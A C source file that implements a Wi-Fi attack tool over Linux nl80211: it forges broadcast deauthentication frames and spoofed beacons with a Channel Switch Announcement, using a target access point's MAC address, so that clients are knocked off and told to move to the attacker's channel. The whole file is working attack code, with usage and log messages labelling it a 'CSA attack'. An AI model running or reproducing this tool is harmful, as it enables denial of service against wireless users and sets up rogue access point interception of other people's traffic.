#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/genetlink.h>
#include <net/if.h>
#include <errno.h>

#define NLA_ALIGN(len) (((len) + 3) & ~3)
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#define NLA_OK(nla, remaining) \
    ((remaining) >= (int)sizeof(struct nlattr) && \
     (nla)->nla_len >= sizeof(struct nlattr) && \
     (nla)->nla_len <= (remaining))
#define NLA_NEXT(nla, remaining) \
    ((remaining) -= NLA_ALIGN((nla)->nla_len), \
     (struct nlattr*)(((char*)(nla)) + NLA_ALIGN((nla)->nla_len)))

static int nl80211_family = -1;

static int get_nl80211_family(int sock) {
    struct {
        struct nlmsghdr hdr;
        struct genlmsghdr genl;
        struct nlattr attr;
        char name[16];
    } req = {0};
    
    req.hdr.nlmsg_len = sizeof(req);
    req.hdr.nlmsg_type = GENL_ID_CTRL;
    req.hdr.nlmsg_flags = NLM_F_REQUEST;
    req.genl.cmd = CTRL_CMD_GETFAMILY;
    req.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
    req.attr.nla_len = sizeof(req.attr) + 8;
    strcpy(req.name, "nl80211");
    req.hdr.nlmsg_len = sizeof(req.hdr) + sizeof(req.genl) + req.attr.nla_len;
    
    send(sock, &req, req.hdr.nlmsg_len, 0);
    
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) return -1;
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)resp;
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    
    struct nlattr *attr = (struct nlattr*)(genl + 1);
    int remaining = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    
    while (NLA_OK(attr, remaining)) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            return *(int*)(attr + 1);
        }
        attr = NLA_NEXT(attr, remaining);
    }
    return -1;
}

static int send_frame(int sock, int ifidx, const unsigned char *frame, int flen, 
                      int freq) {
    unsigned char buf[1024];
    memset(buf, 0, sizeof(buf));
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST;
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_FRAME;
    
    unsigned char *ptr = (unsigned char*)(genl + 1);
    
    struct nlattr *a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_IFINDEX;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = ifidx;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_WIPHY_FREQ;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = freq;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_FRAME;
    a->nla_len = sizeof(*a) + flen;
    memcpy(a + 1, frame, flen);
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_DONT_WAIT_FOR_ACK;
    a->nla_len = sizeof(*a);
    ptr += a->nla_len;
    
    hdr->nlmsg_len = ptr - buf;
    
    return send(sock, buf, hdr->nlmsg_len, 0) > 0 ? 0 : -1;
}

static int freq_to_chan(int freq) {
    if (freq >= 2412 && freq <= 2484) return (freq - 2407) / 5;       // 2.4 GHz: ch 1-14
    if (freq >= 5160 && freq <= 5340) return (freq - 5000) / 5;       // 5 GHz low: ch 32-68
    if (freq >= 5480 && freq <= 5720) return (freq - 5000) / 5;       // 5 GHz mid: ch 96-144
    if (freq >= 5745 && freq <= 5885) return (freq - 5000) / 5;       // 5 GHz high: ch 149-177
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 7) {
        fprintf(stderr, "Usage: %s <iface> <ap_mac> <ssid> <ap_freq> <our_freq> [reason_code]\n", argv[0]);
        fprintf(stderr, "  Sends deauth + CSA beacon: forces clients from <ap_freq> to <our_freq>\n");
        return 1;
    }
    
    const char *iface = argv[1];
    unsigned char ap[6];
    for (int i = 0; i < 6; i++) sscanf(argv[2] + i*3, "%2hhx:", &ap[i]);
    
    const char *ssid = argv[3];
    int ssid_len = strlen(ssid);
    int ap_freq = atoi(argv[4]);
    int our_freq = atoi(argv[5]);
    int reason = (argc >= 7) ? atoi(argv[6]) : 7;
    
    // Calculate channel numbers (2.4 GHz + 5 GHz)
    int ap_chan = freq_to_chan(ap_freq);
    int our_chan = freq_to_chan(our_freq);
    
    if (ap_chan == 0 || our_chan == 0) {
        fprintf(stderr, "Could not determine channel from frequencies %d/%d\n", ap_freq, our_freq);
        return 1;
    }
    
    // Deauth frame: similar to before
    unsigned char deauth[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
        0,0, 0,0
    };
    // RA = broadcast, TA = AP, BSSID = AP
    unsigned char bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    memcpy(deauth+4, bc, 6);
    memcpy(deauth+10, ap, 6);
    memcpy(deauth+16, ap, 6);
    deauth[24] = reason & 0xFF;
    deauth[25] = (reason >> 8) & 0xFF;
    
    // CSA Beacon: 0x80 (beacon) spoofed from AP's MAC, with SSID + CSA IE
    // Fixed header (24 bytes) + timestamp (8) + beacon interval (2) + capability (2) = 36 bytes before IEs
    unsigned char beacon[256];
    memset(beacon, 0, sizeof(beacon));
    int pos = 0;
    
    // Frame Control: Beacon (0x8000)
    beacon[pos++] = 0x80; beacon[pos++] = 0x00;
    // Duration
    beacon[pos++] = 0x00; beacon[pos++] = 0x00;
    // DA = broadcast
    memcpy(beacon+pos, bc, 6); pos += 6;
    // SA = AP MAC (spoofed)
    memcpy(beacon+pos, ap, 6); pos += 6;
    // BSSID = AP MAC
    memcpy(beacon+pos, ap, 6); pos += 6;
    // Sequence (0)
    beacon[pos++] = 0x00; beacon[pos++] = 0x00;
    // Timestamp (8 bytes, any)
    pos += 8;
    // Beacon interval: 100ms (0x0064)
    beacon[pos++] = 0x64; beacon[pos++] = 0x00;
    // Capability: ESS + ShortPreamble + ShortSlot + Privacy (0x0431)
    beacon[pos++] = 0x31; beacon[pos++] = 0x04;
    
    // SSID IE (tag 0)
    beacon[pos++] = 0x00;           // tag: SSID
    beacon[pos++] = ssid_len;       // length
    memcpy(beacon+pos, ssid, ssid_len); pos += ssid_len;
    
    // Supported Rates IE (tag 1) — minimal
    beacon[pos++] = 0x01;           // tag: Supported Rates
    beacon[pos++] = 4;              // length
    beacon[pos++] = 0x82; beacon[pos++] = 0x84; // 1, 2 Mbps (BSS basic)
    beacon[pos++] = 0x8b; beacon[pos++] = 0x96; // 5.5, 11 Mbps
    
    // DSSS Parameter Set (tag 3) — current channel
    beacon[pos++] = 0x03;           // tag: DS Parameter
    beacon[pos++] = 1;              // length
    beacon[pos++] = ap_chan;        // current channel
    
    // CSA IE (tag 37 = 0x25): Channel Switch Announcement
    beacon[pos++] = 0x25;           // tag: CSA
    beacon[pos++] = 3;              // length
    beacon[pos++] = 1;              // Channel Switch Mode: 1 = stop TX until switch
    beacon[pos++] = our_chan;       // New channel
    beacon[pos++] = 1;              // Switch Count: switch in 1 beacon interval
    
    int beacon_len = pos;
    
    // Setup netlink socket
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) { perror("socket"); return 1; }
    
    struct sockaddr_nl sa = {.nl_family = AF_NETLINK};
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    
    nl80211_family = get_nl80211_family(sock);
    if (nl80211_family < 0) { fprintf(stderr, "nl80211 not found\n"); return 1; }
    
    int ifidx = if_nametoindex(iface);
    fprintf(stderr, "CSA attack: %s ch%d -> ch%d for SSID '%s'\n", 
            argv[2], ap_chan, our_chan, ssid);
    
    // Send 20 packets total: alternate deauth + CSA beacon
    // Each iteration sends 1 deauth + 1 CSA beacon (deauth on AP channel, beacon tells client: switch to our channel)
    for (int i = 0; i < 10; i++) {
        // Send deauth on AP's channel (kick client off)
        if (send_frame(sock, ifidx, deauth, sizeof(deauth), ap_freq) == 0) {
            fprintf(stderr, "  [+] deauth %d sent\n", i+1);
        } else {
            fprintf(stderr, "  [-] deauth %d FAILED: %s\n", i+1, strerror(errno));
        }
        usleep(20000);
        
        // Send CSA beacon: client scans, sees beacon saying "router switching to channel X"
        if (send_frame(sock, ifidx, beacon, beacon_len, ap_freq) == 0) {
            fprintf(stderr, "  [+] CSA beacon %d (ch%d->%d) sent\n", i+1, ap_chan, our_chan);
        } else {
            fprintf(stderr, "  [-] CSA beacon %d FAILED: %s\n", i+1, strerror(errno));
        }
        usleep(30000);
    }
    
    close(sock);
    return 0;
}
